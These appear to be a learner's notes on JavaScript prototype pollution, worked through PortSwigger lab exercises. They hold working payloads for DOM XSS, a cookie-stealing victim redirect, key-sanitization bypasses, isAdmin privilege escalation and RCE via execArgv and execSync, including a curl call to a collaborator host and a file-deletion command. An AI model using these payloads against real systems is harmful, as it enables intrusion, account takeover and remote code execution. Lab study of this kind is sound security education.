Successful exploitation of prototype pollution requires the following key components:
- A prototype pollution source - This is any input that enables you to poison prototype objects with arbitrary properties.
- A sink - In other words, a JavaScript function or DOM element that enables arbitrary code execution.
- An exploitable gadget - This is any property that is passed into a sink without proper filtering or sanitization.

### Client-side prototype pollution vulnerabilities
### Finding client-side prototype pollution gadgets manually
TODO: interesting description with debugger

### PRACTITIONER Lab: DOM XSS via client-side prototype pollution
Explanation:
If we provide the following query params in the url:
```bash
https://lab.id.com/?__proto__[transport_url]=data:text/javascript,alert()
```
or simply:
```bash
https://lab.id.com/?__proto__[transport_url]=data:,alert()
```

It will create a new property with they key `transport_url` on `Object.prototype`
All other js objects have this `Object.prototype` at the end of their prototype chain.
This means if the object doesn't have own property called `transport_url` it will then use `transport_url` from the `Object.prototype`

The lab has a weird code (look at `./domXSSViaClientSidePrototypePollution/deparam.js` and a simplified version of it in `./domXSSViaClientSidePrototypePollution/deparam_simplified`)
Eventually what the code inside the `deparam` function does comes down to recursive properties creation on a new object.
Property names are taken from query params.
So we can use this to add new properties on the `Object.prototype`.
Then we need to find a place in the code with an object which accesses its own property that it doesn't have.
If that happens (and since the object doesn't have that property) the property from the `Object.prototype` is going to be accessed instead, and in current lab we can write to that property on `Object.prototype` whatever we want.

So to be more lab specific there's code:
```bash
let config = {params: deparam(new URL(location).searchParams.toString())};

if(config.transport_url) {
    let script = document.createElement('script');
    script.src = config.transport_url;
    document.body.appendChild(script);
}
```

`transport_url` does not exist on config but we can create `transport_url` with the value: `data:text/javascript,alert()` on `Object.prototype` and it will be accessed by the code above and the js code will be executed.

Lab's solution (copied from official lab (DOM Invader solution)):
- Open the lab in Burp's built-in browser.
- Enable DOM Invader and enable the prototype pollution option.
- Open the browser DevTools panel, go to the DOM Invader tab, then reload the page.
- Observe that DOM Invader has identified two prototype pollution vectors in the search property i.e. the query string.
- Click Scan for gadgets. A new tab opens in which DOM Invader begins scanning for gadgets using the selected source.
- When the scan is complete, open the DevTools panel in the same tab as the scan, then go to the DOM Invader tab.
- Observe that DOM Invader has successfully accessed the `script.src` sink via the `transport_url` gadget.
- Click Exploit. DOM Invader automatically generates a proof-of-concept exploit and calls `alert(1)`.

We can also click on `Stack trace` and then open the `Console` tab to actually see the file in which the vulnerable code is located.

### PRACTITIONER Lab: DOM XSS via an alternative prototype pollution vector
Code from the lab (includes jQuery, but jQuery files are not included)
```bash
async function searchLogger() {
    window.macros = {};
    window.manager = {
        params: $.parseParams(new URL(location)),
        macro(property) {
            if (window.macros.hasOwnProperty(property))
                return macros[property]
        }
    };
    let a = manager.sequence || 1;
    manager.sequence = a + 1;

    eval('if(manager && manager.sequence){ manager.macro('+manager.sequence+') }');
}

window.addEventListener("load", searchLogger);
```

jQuery's `$.parseParams` can pullute the prototype of `Object.prototype`

And in the url we can:
```bash
/?__proto__.sequence=alert()-
```

`-` at the end is needed because of the:
```bash
let a = manager.sequence || 1;
manager.sequence = a + 1;
```

### Prototype pollution via the constructor
So far, we've looked exclusively at how you can get a reference to prototype objects via the special `__proto__` accessor property. As this is the classic technique for prototype pollution, a common defense is to strip any properties with the key `__proto__` from user-controlled objects before merging them. This approach is flawed as there are alternative ways to reference Object.prototype without relying on the `__proto__` string at all.

Unless its prototype is set to null, every JavaScript object has a constructor property, which contains a reference to the constructor function that was used to create it. For example, you can create a new object either using literal syntax or by explicitly invoking the Object() constructor as follows:
```bash
let myObjectLiteral = {};
let myObject = new Object();
```

You can then reference the Object() constructor via the built-in constructor property:
```bash
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Remember that functions are also just objects under the hood. Each constructor function has a prototype property, which points to the prototype that will be assigned to any objects that are created by this constructor. As a result, you can also access any object's prototype as follows:
```bash
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

As `myObject.constructor.prototype` is equivalent to `myObject.__proto__`, this provides an alternative vector for prototype pollution.

### Bypassing flawed key sanitization
An obvious way in which websites attempt to prevent prototype pollution is by sanitizing property keys before merging them into an existing object. However, a common mistake is failing to recursively sanitize the input string. For example, consider the following URL:
```bash
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

If the sanitization process just strips the string `__proto__` without repeating this process more than once, this would result in the following URL, which is a potentially valid prototype pollution source:
```bash
vulnerable-website.com/?__proto__.gadget=payload
```

### PRACTITIONER Lab: Client-side prototype pollution via flawed sanitization
Basically the same lab as the `domXSSViaClientSidePrototypePollution` expect now there's this function:
```bash
function sanitizeKey(key) {
    let badProperties = ['constructor','__proto__','prototype'];
    for(let badProperty of badProperties) {
        key = key.replaceAll(badProperty, '');
    }
    return key;
}
```

In the url we can do:
```bash
/?__pro__proto__to__[transport_url]=data%3A%2Calert%281%29
```

Because the sanitization just strips the string `__proto__` without repeating this process more than once

### PRACTITIONER Lab: Client-side prototype pollution in third-party libraries
Use DOM invader to solve the lab

Exploit for the victim:
```bash
<script>
    location.href = 'https://labid.web-security-academy.net/#__proto__[hitCallback]=alert(document.cookie)'
</script>
```

### Prototype pollution via browser APIs
### Prototype pollution via fetch()
The following is an example of how you might send a POST request using fetch():
```bash
fetch('https://normal-website.com/my-account/change-email', {
    method: 'POST',
    body: 'user=carlos&email=carlos%40ginandjuice.shop'
})
```
As you can see, we've explicitly defined method and body properties, but there are a number of other possible properties that we've left undefined. In this case, if an attacker can find a suitable source, they could potentially pollute Object.prototype with their own headers property. This may then be inherited by the options object passed into fetch() and subsequently used to generate the request. 

This can lead to a number of issues. For example, the following code is potentially vulnerable to DOM XSS via prototype pollution:
```bash
fetch('/my-products.json',{method:"GET"})
    .then((response) => response.json())
    .then((data) => {
        let username = data['x-username'];
        let message = document.querySelector('.message');
        if(username) {
            message.innerHTML = `My products. Logged in as <b>${username}</b>`;
        }
        let productList = document.querySelector('ul.products');
        for(let product of data) {
            let product = document.createElement('li');
            product.append(product.name);
            productList.append(product);
        }
    })
    .catch(console.error);
```
 To exploit this, an attacker could pollute Object.prototype with a headers property containing a malicious x-username header as follows:
```bash
?__proto__[headers][x-username]=<img/src/onerror=alert(1)>
```
Let's assume that server-side, this header is used to set the value of the x-username property in the returned JSON file. In the vulnerable client-side code above, this is then assigned to the username variable, which is later passed into the innerHTML sink, resulting in DOM XSS. 

> Note:
>
> You can use this technique to control any undefined properties of the options object passed to fetch(). This may enable you to add a malicious body to the request, for example.

### Prototype pollution via Object.defineProperty()
Developers with some knowledge of prototype pollution may attempt to block potential gadgets by using the Object.defineProperty() method. This enables you to set a non-configurable, non-writable property directly on the affected object as follows:
```bash
Object.defineProperty(vulnerableObject, 'gadgetProperty', {
    configurable: false,
    writable: false
})
```

This may initially seem like a reasonable mitigation attempt as this prevents the vulnerable object from inheriting a malicious version of the gadget property via the prototype chain. However, this approach is inherently flawed. 

Just like the fetch() method we looked at earlier, Object.defineProperty() accepts an options object, known as a "descriptor". You can see this in the example above. Among other things, developers can use this descriptor object to set an initial value for the property that's being defined. However, if the only reason that they're defining this property is to protect against prototype pollution, they might not bother setting a value at all.

In this case, an attacker may be able to bypass this defense by polluting Object.prototype with a malicious value property. If this is inherited by the descriptor object passed to Object.defineProperty(), the attacker-controlled value may be assigned to the gadget property after all. 

### PRACTITIONER Lab: Client-side prototype pollution via browser APIs
The code from the lab:
```bash
async function searchLogger() {
    let config = {params: deparam(new URL(location).searchParams.toString()), transport_url: false};
    Object.defineProperty(config, 'transport_url', {configurable: false, writable: false});
    if(config.transport_url) {
        let script = document.createElement('script');
        script.src = config.transport_url;
        document.body.appendChild(script);
    }
    if(config.params && config.params.search) {
        await logQuery('/logger', config.params);
    }
}
```

To understand the exploit read the `Prototype pollution via Object.defineProperty()` section above

Exploit:
```bash
/?__proto__[value]=data%3A%2Calert%281%29
```

### Server-side prototype pollution
### Detecting server-side prototype pollution via polluted property reflection
An easy trap for developers to fall into is forgetting or overlooking the fact that a JavaScript for...in loop iterates over all of an object's enumerable properties, including ones that it has inherited via the prototype chain. 

> Note:
>
> This doesn't include built-in properties set by JavaScript's native constructors as these are non-enumerable by default. 

You can test this out for yourself as follows:
```bash
const myObject = { a: 1, b: 2 };

// pollute the prototype with an arbitrary property
Object.prototype.foo = 'bar';

// confirm myObject doesn't have its own foo property
myObject.hasOwnProperty('foo'); // false

// list names of properties of myObject
for(const propertyKey in myObject){
    console.log(propertyKey);
}

// Output: a, b, foo
```

This also applies to arrays, where a for...in loop first iterates over each index, which is essentially just a numeric property key under the hood, before moving on to any inherited properties as well. 
```bash
const myArray = ['a','b'];
Object.prototype.foo = 'bar';

for(const arrayKey in myArray){
    console.log(arrayKey);
}

// Output: 0, 1, foo
```

In either case, if the application later includes the returned properties in a response, this can provide a simple way to probe for server-side prototype pollution.

POST or PUT requests that submit JSON data to an application or API are prime candidates for this kind of behavior as it's common for servers to respond with a JSON representation of the new or updated object. In this case, you could attempt to pollute the global Object.prototype with an arbitrary property as follows: 
```bash
POST /user/update HTTP/1.1
Host: vulnerable-website.com
...
{
    "user":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "__proto__":{
        "foo":"bar"
    }
}
```

If the website is vulnerable, your injected property would then appear in the updated object in the response:
```bash
HTTP/1.1 200 OK
...
{
    "username":"wiener",
    "firstName":"Peter",
    "lastName":"Wiener",
    "foo":"bar"
}
```
In rare cases, the website may even use these properties to dynamically generate HTML, resulting in the injected property being rendered in your browser.

Once you identify that server-side prototype pollution is possible, you can then look for potential gadgets to use for an exploit. Any features that involve updating user data are worth investigating as these often involve merging the incoming data into an existing object that represents the user within the application. If you can add arbitrary properties to your own user, this can potentially lead to a number of vulnerabilities, including privilege escalation. 

### PRACTITIONER Lab: Privilege escalation via server-side prototype pollution
Lab's description:
This lab is built on Node.js and the Express framework. It is vulnerable to server-side prototype pollution because it unsafely merges user-controllable input into a server-side JavaScript object. This is simple to detect because any polluted properties inherited via the prototype chain are visible in an HTTP response.

To solve the lab:
- Find a prototype pollution source that you can use to add arbitrary properties to the global Object.prototype.
- Identify a gadget property that you can use to escalate your privileges.
- Access the admin panel and delete the user carlos.

Solution:
When we send the req body:
```bash
{
    "address_line_1":"Wiener2 HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"qDR2S8JVooiqc640hOjYyO6Jsp88aMWf",
	"__proto__":{
        "ff":"tino"
    }
}
```
In the response we see `"ff":"tino"`:
```bash
{"username":"wiener","firstname":"Peter","lastname":"Wiener","address_line_1":"Wiener2 HQ","address_line_2":"One Wiener Way","city":"Wienerville","postcode":"BU1 1RP","country":"UK","isAdmin":false,"ff":"tino"}
```

So we send the following req and we become an admin:
```bash
{
    "address_line_1":"Wiener2 HQ",
    "address_line_2":"One Wiener Way",
    "city":"Wienerville",
    "postcode":"BU1 1RP",
    "country":"UK",
    "sessionId":"qDR2S8JVooiqc640hOjYyO6Jsp88aMWf",
	"__proto__":{
        "isAdmin":true
    }
}
```

Notice that the `isAdmin` value in the response has been updated. This suggests that the object doesn't have its own `isAdmin` property, but has instead inherited it from the polluted prototype

### Detecting server-side prototype pollution without polluted property reflection
Most of the time, even when you successfully pollute a server-side prototype object, you won't see the affected property reflected in a response. Given that you can't just inspect the object in a console either, this presents a challenge when trying to tell whether your injection worked.

One approach is to try injecting properties that match potential configuration options for the server. You can then compare the server's behavior before and after the injection to see whether this configuration change appears to have taken effect. If so, this is a strong indication that you've successfully found a server-side prototype pollution vulnerability. 

In this section, we'll look at the following techniques:
- Status code override
- JSON spaces override
- Charset override

All of these injections are non-destructive, but still produce a consistent and distinctive change in server behavior when successful.

This is just a small selection of potential techniques to give you an idea of what's possible. For more technical details and an insight into how PortSwigger Research was able to develop these techniques, check out the accompanying whitepaper Server-side prototype pollution: Black-box detection without the DoS by Gareth Heyes: 
```
https://portswigger.net/research/server-side-prototype-pollution
```

### Status code override
Server-side JavaScript frameworks like Express allow developers to set custom HTTP response statuses. In the case of errors, a JavaScript server may issue a generic HTTP response, but include an error object in JSON format in the body. This is one way of providing additional details about why an error occurred, which may not be obvious from the default HTTP status.

Although it's somewhat misleading, it's even fairly common to receive a 200 OK response, only for the response body to contain an error object with a different status.
```bash
HTTP/1.1 200 OK
...
{
    "error": {
        "success": false,
        "status": 401,
        "message": "You do not have permission to access this resource."
    }
}
```

Node's http-errors module contains the following function for generating this kind of error response:
```bash
function createError () {
    //...
    if (type === 'object' && arg instanceof Error) {
        err = arg
        status = err.status || err.statusCode || status
    } else if (type === 'number' && i === 0) {
    //...
    if (typeof status !== 'number' ||
    (!statuses.message[status] && (status < 400 || status >= 600))) {
        status = 500
    }
    //...
```
The first highlighted line attempts to assign the status variable by reading the status or statusCode property from the object passed into the function. If the website's developers haven't explicitly set a status property for the error, you can potentially use this to probe for prototype pollution as follows:
- Find a way to trigger an error response and take note of the default status code.
- Try polluting the prototype with your own status property. Be sure to use an obscure status code that is unlikely to be issued for any other reason.
- Trigger the error response again and check whether you've successfully overridden the status code.

> Note:
>
> You must choose a status code in the 400-599 range. Otherwise, Node defaults to a 500 status regardless, as you can see from the second highlighted line, so you won't know whether you've polluted the prototype or not. 

### JSON spaces override
The Express framework provides a `json spaces` option, which enables you to configure the number of spaces used to indent any JSON data in the response. In many cases, developers leave this property undefined as they're happy with the default value, making it susceptible to pollution via the prototype chain.

If you've got access to any kind of JSON response, you can try polluting the prototype with your own `json spaces` property, then reissue the relevant request to see if the indentation in the JSON increases accordingly. You can perform the same steps to remove the indentation in order to confirm the vulnerability.

This is an especially useful technique because it doesn't rely on a specific property being reflected. It's also extremely safe as you're effectively able to turn the pollution on and off simply by resetting the property to the same value as the default.

Although the prototype pollution has been fixed in Express 4.17.4, websites that haven't upgraded may still be vulnerable. 

> Note:
>
> When attempting this technique in Burp, remember to switch to the message editor's Raw tab. Otherwise, you won't be able to see the indentation change as the default prettified view normalizes this

### Charset override
Express servers often implement so-called "middleware" modules that enable preprocessing of requests before they're passed to the appropriate handler function. For example, the body-parser module is commonly used to parse the body of incoming requests in order to generate a req.body object. This contains another gadget that you can use to probe for server-side prototype pollution.

Notice that the following code passes an options object into the read() function, which is used to read in the request body for parsing. One of these options, encoding, determines which character encoding to use. This is either derived from the request itself via the getCharset(req) function call, or it defaults to UTF-8.
```bash
var charset = getCharset(req) or 'utf-8'

function getCharset (req) {
    try {
        return (contentType.parse(req).parameters.charset || '').toLowerCase()
    } catch (e) {
        return undefined
    }
}

read(req, res, next, parse, debug, {
    encoding: charset,
    inflate: inflate,
    limit: limit,
    verify: verify
})
```
If you look closely at the `getCharset()` function, it looks like the developers have anticipated that the Content-Type header may not contain an explicit charset attribute, so they've implemented some logic that reverts to an empty string in this case. Crucially, this means it may be controllable via prototype pollution.

If you can find an object whose properties are visible in a response, you can use this to probe for sources. In the following example, we'll use UTF-7 encoding and a JSON source:

Add an arbitrary UTF-7 encoded string to a property that's reflected in a response. For example, `foo` in UTF-7 is `+AGYAbwBv-`.
```bash
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"+AGYAbwBv-"
}
```
Send the request. Servers won't use UTF-7 encoding by default, so this string should appear in the response in its encoded form.

Try to pollute the prototype with a content-type property that explicitly specifies the UTF-7 character set:
```bash
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"default",
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
}
```

Repeat the first request. If you successfully polluted the prototype, the UTF-7 string should now be decoded in the response:
```bash
{
    "sessionId":"0123456789",
    "username":"wiener",
    "role":"foo"
}
```

Due to a bug in Node's `_http_incoming` module, this works even when the request's actual `Content-Type` header includes its own charset attribute. To avoid overwriting properties when a request contains duplicate headers, the `_addHeaderLine()` function checks that no property already exists with the same key before transferring properties to an `IncomingMessage` object
```bash
IncomingMessage.prototype._addHeaderLine = _addHeaderLine;
function _addHeaderLine(field, value, dest) {
    // ...
    } else if (dest[field] === undefined) {
        // Drop duplicates
        dest[field] = value;
    }
}
```
If it does, the header being processed is effectively dropped. Due to the way this is implemented, this check (presumably unintentionally) includes properties inherited via the prototype chain. This means that if we pollute the prototype with our own content-type property, the property representing the real Content-Type header from the request is dropped at this point, along with the intended value derived from the header

### PRACTITIONER Lab: Detecting server-side prototype pollution without polluted property reflection
The lab is about identifying the prototype pollution. 
So I tried charset override by sending the body:
```bash
...
    "__proto__":{
        "content-type": "application/json; charset=utf-7"
    }
```

Also JSON spaces override:
```bash
   "__proto__":{
        "json spaces": "7"
    }
```
The response was:
```bash
{
7"username": "wiener",
7"firstname": "Peter",
7"lastname": "Wiener",
7"address_line_1": "Wiener2 HQ",
7"address_line_2": "foo",
7"city": "Wienerville",
7"postcode": "BU1 1RP",
7"country": "UK",
7"isAdmin": false
}
```

### Scanning for server-side prototype pollution sources
- Install the Server-Side Prototype Pollution Scanner extension from the BApp Store and make sure that it is enabled. For details on how to do this, see Installing extensions
- Explore the target website using Burp's browser to map as much of the content as possible and accumulate traffic in the proxy history.
- In Burp, go to the Proxy > HTTP history tab.
- Filter the list to show only in-scope items.
- Select all items in the list.
- Right-click your selection and go to Extensions > Server-Side Prototype Pollution Scanner > Server-Side Prototype Pollution, then select one of the scanning techniques from the list.
- When prompted, modify the attack configuration if required, then click OK to launch the scan.

In Burp Suite Professional, the extension reports any prototype pollution sources it finds via the Issue activity panel on the Dashboard and Target tabs. If you're using Burp Suite Community Edition, you need to go to the Extensions > Installed tab, select the extension, then monitor its Output tab for any reported issues. 

> Note:
>
> If you're unsure which scanning technique to use, you can also select Full scan to run a scan using all of the available techniques. However, this will involve sending significantly more requests. 

### Bypassing input filters for server-side prototype pollution
Websites often attempt to prevent or patch prototype pollution vulnerabilities by filtering suspicious keys like `__proto__`. This key sanitization approach is not a robust long-term solution as there are a number of ways it can potentially be bypassed. For example, an attacker can:
- Obfuscate the prohibited keywords so they're missed during the sanitization. For more information, see Bypassing flawed key sanitization.
- Access the prototype via the constructor property instead of __proto__. For more information, see Prototype pollution via the constructor

Node applications can also delete or disable __proto__ altogether using the command-line flags --disable-proto=delete or --disable-proto=throw respectively. However, this can also be bypassed by using the constructor technique. 

### PRACTITIONER Lab: Bypassing flawed input filters for server-side prototype pollution
One way of bypassing filters is by using `constructor`, as `myObject.constructor.prototype` is equivalent to `myObject.__proto__`:
```bash
{
    "address_line_1": "Wiener2 HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "dNAgwf2sCTAoS33HT6R2qR5VWRaIlI9x",
    "constructor": {
        "prototype": {
            "json spaces":10
        }
    }
}
```

So to solve the lab:
```bash
{
    "address_line_1": "Wiener2 HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "dNAgwf2sCTAoS33HT6R2qR5VWRaIlI9x",
    "constructor": {
        "prototype": {
            "isAdmin":true
        }
    }
}
```

### Remote code execution via server-side prototype pollution
There are a number of potential command execution sinks in Node, many of which occur in the child_process module. These are often invoked by a request that occurs asynchronously to the request with which you're able to pollute the prototype in the first place. As a result, the best way to identify these requests is by polluting the prototype with a payload that triggers an interaction with Burp Collaborator when called. 

The `NODE_OPTIONS` environment variable enables you to define a string of command-line arguments that should be used by default whenever you start a new Node process. As this is also a property on the env object, you can potentially control this via prototype pollution if it is undefined. 

Some of Node's functions for creating new child processes accept an optional shell property, which enables developers to set a specific shell, such as bash, in which to run commands. By combining this with a malicious NODE_OPTIONS property, you can pollute the prototype in a way that causes an interaction with Burp Collaborator whenever a new Node process is created:
```bash
"__proto__": {
    "shell":"node",
    "NODE_OPTIONS":"--inspect=YOUR-COLLABORATOR-ID.oastify.com\"\".oastify\"\".com"
}
```

This way, you can easily identify when a request creates a new child process with command-line arguments that are controllable via prototype pollution.

> Tip:
>
> The escaped double-quotes in the hostname aren't strictly necessary. However, this can help to reduce false positives by obfuscating the hostname to evade WAFs and other systems that scrape for hostnames. 

### Remote code execution via child_process.fork()
Methods such as child_process.spawn() and child_process.fork() enable developers to create new Node subprocesses. The fork() method accepts an options object in which one of the potential options is the execArgv property. This is an array of strings containing command-line arguments that should be used when spawning the child process. If it's left undefined by the developers, this potentially also means it can be controlled via prototype pollution.

As this gadget lets you directly control the command-line arguments, this gives you access to some attack vectors that wouldn't be possible using `NODE_OPTIONS`. Of particular interest is the `--eval` argument, which enables you to pass in arbitrary JavaScript that will be executed by the child process. This can be quite powerful, even enabling you to load additional modules into the environment: 
```bash
"execArgv": [
    "--eval=require('<module>')"
]
```

In addition to fork(), the `child_process` module contains the execSync() method, which executes an arbitrary string as a system command. By chaining these JavaScript and command injection sinks, you can potentially escalate prototype pollution to gain full RCE capability on the server. 

### PRACTITIONER Lab: Remote code execution via server-side prototype pollution
First we try:
```bash
{
    "address_line_1": "Wiener2 HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "2uTj6SbgeYc2VShZL0NYq8J6d80YWcY5",
    "__proto__": {
        "json spaces": 10
    }
}
```

And see that we can pollute the prototype, so we try the next thing:
```bash
{
    "address_line_1": "Wiener2 HQ",
    "address_line_2": "One Wiener Way",
    "city": "Wienerville",
    "postcode": "BU1 1RP",
    "country": "UK",
    "sessionId": "OlBbLuOjXn178y9mmKUwtytrPyXwmwHX",
    "__proto__": {
        "execArgv": [
            "--eval=require('child_process').execSync('curl https://6fmmq6r6z6pccas90dmc759vdmjd73vs.oastify.com')"
        ]
    }
}
```

And finally:
```bash
"__proto__": {
    "execArgv":[
        "--eval=require('child_process').execSync('rm /home/carlos/morale.txt')"
    ]
}
```

### Remote code execution via child_process.execSync()
